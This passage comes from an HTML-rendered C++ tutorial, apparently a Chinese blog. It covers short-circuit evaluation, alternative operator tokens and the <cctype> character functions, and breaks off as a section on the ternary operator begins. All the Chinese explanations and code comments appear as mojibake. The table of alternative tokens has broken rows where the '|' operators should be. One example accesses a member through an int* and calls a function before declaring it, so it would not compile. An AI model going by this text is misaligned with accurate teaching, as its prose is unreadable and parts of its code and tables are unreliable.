class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> divisor = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®‰å…¨çš„é™¤æ³•æ£€æŸ¥ (å› ä¸º divisor ä¸º 0ï¼Œå³ä¾§ä¸ä¼šæ‰§è¡Œ)</span></span><br><span class="line">    <span class="keyword">if</span> (divisor != <span class="number">0</span> &amp;&amp; value / divisor &gt; <span class="number">1</span>) &#123; </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Result is greater than 1.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Divisor is zero or result is not greater than 1.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *ptr = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="comment">// å®‰å…¨çš„æŒ‡é’ˆè®¿é—® (å› ä¸º ptr ä¸º nullptrï¼Œå³ä¾§ä¸ä¼šæ‰§è¡Œ)</span></span><br><span class="line">    <span class="keyword">if</span> (ptr != <span class="literal">nullptr</span> &amp;&amp; ptr-&gt;some_member == <span class="number">5</span>) &#123; </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pointer member is 5.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pointer is null or member is not 5.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// || çš„çŸ­è·¯ (å› ä¸º ++count &gt; 0 ä¸º trueï¼Œå³ä¾§ä¸ä¼šæ‰§è¡Œ)</span></span><br><span class="line">    <span class="keyword">if</span> (++count &gt; <span class="number">0</span> || some_expensive_function()) &#123; </span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Condition met. Count is &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// count å˜ä¸º 1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">some_expensive_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Expensive function called!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¿™è¡Œä¸ä¼šè¢«æ‰“å°</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="6-2-6-å…¶ä»–è¡¨ç¤ºæ–¹å¼"><a href="#6-2-6-å…¶ä»–è¡¨ç¤ºæ–¹å¼" class="headerlink" title="6.2.6 å…¶ä»–è¡¨ç¤ºæ–¹å¼"></a>6.2.6 å…¶ä»–è¡¨ç¤ºæ–¹å¼</h3><p>ä¸ºäº†å…¼å®¹æŸäº›å¯èƒ½ç¼ºå°‘ <code>|</code>, <code>&amp;</code>, <code>!</code> å­—ç¬¦çš„é”®ç›˜æˆ–å­—ç¬¦é›†ï¼ŒC++ æ ‡å‡†å®šä¹‰äº†ä¸€äº›æ›¿ä»£è¡¨ç¤ºï¼ˆä¹Ÿç§°ä¸º â€œdigraphsâ€ æˆ– â€œalternative tokensâ€ï¼‰ã€‚è¿™äº›æ˜¯å…³é”®å­—ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œæ— éœ€åŒ…å«ç‰¹æ®Šå¤´æ–‡ä»¶ã€‚</p><table><thead><tr><th align="left">é€»è¾‘è¿ç®—ç¬¦</th><th align="left">æ›¿ä»£è¡¨ç¤º</th></tr></thead><tbody><tr><td align="left"><code>&amp;&amp;</code></td><td align="left"><code>and</code></td></tr><tr><td align="left">`</td><td align="left"></td></tr><tr><td align="left"><code>!</code></td><td align="left"><code>not</code></td></tr><tr><td align="left"><code>&amp;=</code></td><td align="left"><code>and_eq</code></td></tr><tr><td align="left">`</td><td align="left">=`</td></tr><tr><td align="left"><code>^=</code></td><td align="left"><code>xor_eq</code></td></tr><tr><td align="left"><code>~</code></td><td align="left"><code>compl</code></td></tr><tr><td align="left"><code>&amp;</code></td><td align="left"><code>bitand</code></td></tr><tr><td align="left">`</td><td align="left">`</td></tr><tr><td align="left"><code>^</code></td><td align="left"><code>xor</code></td></tr><tr><td align="left"><code>!=</code></td><td align="left"><code>not_eq</code></td></tr></tbody></table><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">5</span>, y = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨æ›¿ä»£è¡¨ç¤º</span></span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">0</span> <span class="keyword">and</span> y &lt; <span class="number">20</span>) &#123; <span class="comment">// ç­‰ä»·äº x &gt; 0 &amp;&amp; y &lt; 20</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Condition (and) is true.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0</span> <span class="keyword">or</span> y == <span class="number">10</span>) &#123; <span class="comment">// ç­‰ä»·äº x &lt; 0 || y == 10</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Condition (or) is true.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> flag) &#123; <span class="comment">// ç­‰ä»·äº !flag</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Condition (not) is true.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (x <span class="keyword">not_eq</span> y) &#123; <span class="comment">// ç­‰ä»·äº x != y</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Condition (not_eq) is true.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶è¿™äº›æ›¿ä»£è¡¨ç¤ºæ˜¯åˆæ³•çš„ C++ï¼Œä½†åœ¨ç°ä»£ç¼–ç¨‹å®è·µä¸­ï¼Œç›´æ¥ä½¿ç”¨ç¬¦å·è¿ç®—ç¬¦ (<code>&amp;&amp;</code>, <code>||</code>, <code>!</code>) æ›´ä¸ºå¸¸è§å’Œæ™®éæ¥å—ã€‚é™¤éæœ‰ç‰¹å®šçš„ç¼–ç æ ‡å‡†æˆ–ç¯å¢ƒé™åˆ¶è¦æ±‚ä½¿ç”¨æ›¿ä»£è¡¨ç¤ºï¼Œå¦åˆ™é€šå¸¸åšæŒä½¿ç”¨ç¬¦å·è¿ç®—ç¬¦ã€‚</p><h2 id="6-3-å­—ç¬¦å‡½æ•°åº“cctype"><a href="#6-3-å­—ç¬¦å‡½æ•°åº“cctype" class="headerlink" title="6.3 å­—ç¬¦å‡½æ•°åº“cctype"></a>6.3 å­—ç¬¦å‡½æ•°åº“cctype</h2><p>C++ ç»§æ‰¿äº† C è¯­è¨€çš„ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å‡½æ•°åº“ï¼Œç”¨äºå¤„ç†å­—ç¬¦ã€‚è¿™ä¸ªåº“çš„ C++ å¤´æ–‡ä»¶æ˜¯ <code>&lt;cctype&gt;</code>ï¼Œå¯¹åº”çš„ C å¤´æ–‡ä»¶æ˜¯ <code>&lt;ctype.h&gt;</code>ã€‚å®ƒæä¾›äº†ä¸€ç³»åˆ—å‡½æ•°ï¼Œå¯ä»¥æ–¹ä¾¿åœ°æ£€æŸ¥å­—ç¬¦çš„ç±»åˆ«ï¼ˆä¾‹å¦‚ï¼Œæ˜¯å¦æ˜¯å­—æ¯ã€æ•°å­—ã€æ ‡ç‚¹ç¬¦å·ã€ç©ºç™½ç­‰ï¼‰ä»¥åŠè½¬æ¢å­—ç¬¦çš„å¤§å°å†™ã€‚</p><p>è¿™äº›å‡½æ•°é€šå¸¸æ¥æ”¶ä¸€ä¸ª <code>int</code> ç±»å‹çš„å‚æ•°ï¼ˆè¯¥å‚æ•°å€¼åº”èƒ½è¡¨ç¤ºä¸º <code>unsigned char</code> æˆ–ç­‰äº <code>EOF</code>ï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ª <code>int</code> å€¼ã€‚å¯¹äºæµ‹è¯•å‡½æ•°ï¼Œè¿”å›éé›¶å€¼ï¼ˆé€šå¸¸è§£é‡Šä¸º <code>true</code>ï¼‰è¡¨ç¤ºæ¡ä»¶æ»¡è¶³ï¼Œè¿”å›é›¶å€¼ï¼ˆè§£é‡Šä¸º <code>false</code>ï¼‰è¡¨ç¤ºæ¡ä»¶ä¸æ»¡è¶³ã€‚å¯¹äºè½¬æ¢å‡½æ•°ï¼Œè¿”å›è½¬æ¢åçš„å­—ç¬¦çš„æ•´æ•°è¡¨ç¤ºã€‚</p><p><strong>åŒ…å«å¤´æ–‡ä»¶:</strong></p><p>è¦ä½¿ç”¨è¿™äº›å‡½æ•°ï¼Œéœ€è¦åŒ…å« <code>&lt;cctype&gt;</code> å¤´æ–‡ä»¶ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>å¸¸ç”¨çš„å­—ç¬¦æµ‹è¯•å‡½æ•°:</strong></p><table><thead><tr><th align="left">å‡½æ•°å</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><code>isalnum(ch)</code></td><td align="left">å¦‚æœ <code>ch</code> æ˜¯å­—æ¯ï¼ˆ<code>isalpha</code>ï¼‰æˆ–æ•°å­—ï¼ˆ<code>isdigit</code>ï¼‰ï¼Œè¿”å› <code>true</code>ã€‚</td></tr><tr><td align="left"><code>isalpha(ch)</code></td><td align="left">å¦‚æœ <code>ch</code> æ˜¯å­—æ¯ï¼ˆå¤§å†™æˆ–å°å†™ï¼‰ï¼Œè¿”å› <code>true</code>ã€‚</td></tr><tr><td align="left"><code>isblank(ch)</code></td><td align="left">(C++11) å¦‚æœ <code>ch</code> æ˜¯æ ‡å‡†ç©ºç™½å­—ç¬¦ï¼ˆé€šå¸¸æ˜¯ç©ºæ ¼æˆ–æ°´å¹³åˆ¶è¡¨ç¬¦ <code>\t</code>ï¼‰ï¼Œè¿”å› <code>true</code>ã€‚</td></tr><tr><td align="left"><code>iscntrl(ch)</code></td><td align="left">å¦‚æœ <code>ch</code> æ˜¯æ§åˆ¶å­—ç¬¦ï¼ˆä¾‹å¦‚ <code>\n</code>, <code>\t</code>, ASCII 0-31 å’Œ 127ï¼‰ï¼Œè¿”å› <code>true</code>ã€‚</td></tr><tr><td align="left"><code>isdigit(ch)</code></td><td align="left">å¦‚æœ <code>ch</code> æ˜¯åè¿›åˆ¶æ•°å­—ï¼ˆâ€™0â€™ åˆ° â€˜9â€™ï¼‰ï¼Œè¿”å› <code>true</code>ã€‚</td></tr><tr><td align="left"><code>isgraph(ch)</code></td><td align="left">å¦‚æœ <code>ch</code> æ˜¯é™¤ç©ºæ ¼å¤–çš„ä»»ä½•å¯æ‰“å°å­—ç¬¦ï¼Œè¿”å› <code>true</code>ã€‚</td></tr><tr><td align="left"><code>islower(ch)</code></td><td align="left">å¦‚æœ <code>ch</code> æ˜¯å°å†™å­—æ¯ï¼Œè¿”å› <code>true</code>ã€‚</td></tr><tr><td align="left"><code>isprint(ch)</code></td><td align="left">å¦‚æœ <code>ch</code> æ˜¯ä»»ä½•å¯æ‰“å°å­—ç¬¦ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰ï¼Œè¿”å› <code>true</code>ã€‚</td></tr><tr><td align="left"><code>ispunct(ch)</code></td><td align="left">å¦‚æœ <code>ch</code> æ˜¯æ ‡ç‚¹ç¬¦å·ï¼ˆ<code>isgraph</code> ä¸º <code>true</code> ä½† <code>isalnum</code> ä¸º <code>false</code>ï¼‰ï¼Œè¿”å› <code>true</code>ã€‚</td></tr><tr><td align="left"><code>isspace(ch)</code></td><td align="left">å¦‚æœ <code>ch</code> æ˜¯æ ‡å‡†ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€æ¢é¡µ <code>\f</code>ã€æ¢è¡Œ <code>\n</code>ã€å›è½¦ <code>\r</code>ã€æ°´å¹³åˆ¶è¡¨ç¬¦ <code>\t</code>ã€å‚ç›´åˆ¶è¡¨ç¬¦ <code>\v</code>ï¼‰ï¼Œè¿”å› <code>true</code>ã€‚</td></tr><tr><td align="left"><code>isupper(ch)</code></td><td align="left">å¦‚æœ <code>ch</code> æ˜¯å¤§å†™å­—æ¯ï¼Œè¿”å› <code>true</code>ã€‚</td></tr><tr><td align="left"><code>isxdigit(ch)</code></td><td align="left">å¦‚æœ <code>ch</code> æ˜¯åå…­è¿›åˆ¶æ•°å­—ï¼ˆâ€™0â€™-â€˜9â€™, â€˜aâ€™-â€˜fâ€™, â€˜Aâ€™-â€˜Fâ€™ï¼‰ï¼Œè¿”å› <code>true</code>ã€‚</td></tr></tbody></table><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹ (æµ‹è¯•å‡½æ•°):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> text = <span class="string">&quot;Hello World! 123\t&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> alpha_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> digit_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> punct_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> space_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Analyzing text: \&quot;&quot;</span> &lt;&lt; text &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> ch : text) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isalpha</span>(ch)) &#123;</span><br><span class="line">            alpha_count++;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">isupper</span>(ch)) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is uppercase alpha.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// islower(ch)</span></span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is lowercase alpha.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isdigit</span>(ch)) &#123;</span><br><span class="line">            digit_count++;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is a digit.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">ispunct</span>(ch)) &#123;</span><br><span class="line">            punct_count++;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is punctuation.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isspace</span>(ch)) &#123;</span><br><span class="line">            space_count++;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; (ASCII &quot;</span> &lt;&lt; <span class="keyword">int</span>(ch) &lt;&lt; <span class="string">&quot;) is whitespace.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">iscntrl</span>(ch)) &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; (ASCII &quot;</span> &lt;&lt; <span class="keyword">int</span>(ch) &lt;&lt; <span class="string">&quot;) is a control character.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is something else.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSummary:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Alphabetic: &quot;</span> &lt;&lt; alpha_count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Digits: &quot;</span> &lt;&lt; digit_count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Punctuation: &quot;</span> &lt;&lt; punct_count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Whitespace: &quot;</span> &lt;&lt; space_count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å¸¸ç”¨çš„å­—ç¬¦è½¬æ¢å‡½æ•°:</strong></p><table><thead><tr><th align="left">å‡½æ•°å</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><code>tolower(ch)</code></td><td align="left">å¦‚æœ <code>ch</code> æ˜¯å¤§å†™å­—æ¯ï¼Œè¿”å›å…¶å¯¹åº”çš„å°å†™å­—æ¯ï¼›å¦åˆ™ï¼Œè¿”å› <code>ch</code> ä¸å˜ã€‚</td></tr><tr><td align="left"><code>toupper(ch)</code></td><td align="left">å¦‚æœ <code>ch</code> æ˜¯å°å†™å­—æ¯ï¼Œè¿”å›å…¶å¯¹åº”çš„å¤§å†™å­—æ¯ï¼›å¦åˆ™ï¼Œè¿”å› <code>ch</code> ä¸å˜ã€‚</td></tr></tbody></table><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹ (è½¬æ¢å‡½æ•°):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;CONVERT This Message.&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> lower_message = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> upper_message = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> ch : message) &#123;</span><br><span class="line">        lower_message += <span class="built_in">tolower</span>(ch); <span class="comment">// å°†æ¯ä¸ªå­—ç¬¦è½¬æ¢ä¸ºå°å†™å¹¶é™„åŠ </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original:  &quot;</span> &lt;&lt; message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Lowercase: &quot;</span> &lt;&lt; lower_message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è½¬æ¢ä¸ºå¤§å†™</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> ch : message) &#123;</span><br><span class="line">        upper_message += <span class="built_in">toupper</span>(ch); <span class="comment">// å°†æ¯ä¸ªå­—ç¬¦è½¬æ¢ä¸ºå¤§å†™å¹¶é™„åŠ </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Uppercase: &quot;</span> &lt;&lt; upper_message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¤ºä¾‹ï¼šä¸åŒºåˆ†å¤§å°å†™çš„æ¯”è¾ƒ</span></span><br><span class="line">    <span class="keyword">char</span> response;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nDo you want to continue? (Y/N): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; response;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">tolower</span>(response) == <span class="string">&#x27;y&#x27;</span>) &#123; <span class="comment">// å°†è¾“å…¥è½¬æ¢ä¸ºå°å†™å†æ¯”è¾ƒ</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Continuing...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Exiting...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>&lt;cctype&gt;</code> åº“æä¾›äº†ä¸€å¥—æ ‡å‡†ã€å¯ç§»æ¤çš„å‡½æ•°æ¥å¤„ç†å­—ç¬¦åˆ†ç±»å’Œè½¬æ¢ï¼Œè¿™åœ¨å¤„ç†ç”¨æˆ·è¾“å…¥ã€è§£ææ–‡æœ¬æˆ–è¿›è¡Œä¸åŒºåˆ†å¤§å°å†™çš„æ“ä½œæ—¶éå¸¸æœ‰ç”¨ã€‚</p><h2 id="6-4-ä¸‰å…ƒè¿ç®—ç¬¦"><a href="#6-4-ä¸‰å…ƒè¿ç®—ç¬¦" class="headerlink" title="6.4 ä¸‰å…ƒè¿ç®—ç¬¦"></a>6.4 ä¸‰å…ƒè¿ç®—ç¬¦</h2><p>C++ æä¾›äº†ä¸€ä¸ªç®€æ´çš„æ¡ä»¶è¿ç®—ç¬¦ï¼Œç§°ä¸ºä¸‰å…ƒè¿ç®—ç¬¦ï¼ˆæˆ–æ¡ä»¶è¿ç®—ç¬¦ï¼‰ï¼Œå®ƒæ˜¯ C++ 